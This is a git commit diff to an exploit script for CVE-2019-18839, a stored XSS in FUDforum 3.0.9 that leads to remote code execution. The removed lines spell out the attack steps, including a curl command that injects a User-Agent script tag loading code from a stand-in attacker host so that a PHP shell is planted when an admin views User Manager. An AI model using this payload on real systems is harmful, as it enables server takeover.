5f895678089bdb8a89bf9ada56ea3043d8a051b0
Joseph McPeters <44779781+fuzzlove@users.noreply.github.com>
2019-11-09 12:19:56 -0500

    Update fud.js

--- fud.js
+++ fud.js
@@ -6,25 +6,15 @@
 // Version               : 3.0.9
 // Software Link         : https://sourceforge.net/projects/fudforum/
 // Tested On             : Windows / mysql / apache
-// Author Site           : http://incidentsecurity.com | demo: https://youtu.be/0gsJQ82TXw4 | https://youtu.be/fR8hVK1paks
+// Author Site           : https://github.com/fuzzlove/FUDforum-XSS-RCE
+// Demo                  : https://youtu.be/0gsJQ82TXw4 | https://youtu.be/fR8hVK1paks
 // CVE                   : CVE-2019-18839
 //
 // Greetz : wetw0rk, Fr13ndz, offsec =)
 //
-// Description: FUDForum 3.0.9 is vulnerable to Stored XSS via the user-agent request header.
-// This may result in remote code execution. An attacker can use a user account to fully compromise the system using a GET request.
-// When the admin visits the user information under "User Manager" in the control panel the payload will execute.
-// This will allow for PHP files to be written to the web root, and for code to execute on the remote server. 
+// Description: Multiple Stored XSS vulnerabilities have been found in FUDforum 3.0.9 that may result in remote code execution.
 //
-// Notes: 
 //
-// 1. Register an account and log in to the forum. If you have an IP already associated with a registered user this is not required.
-//    This step is so when you run the XSS payload from your attacker machine it gets logged under the user activity.
-//
-// 2. Send the XSS payload below (from an IP associated with an account) / host the script:
-// curl -A '<script src="http://attacker.machine/fud.js"></script>' http://target.machine/fudforum/index.php
-//
-// 3. When the admin visits the user information from the admin controls / User Manager the payload will fire under "Recent sessions", uploading a php shell on the remote system.
 
 function patience()
 {
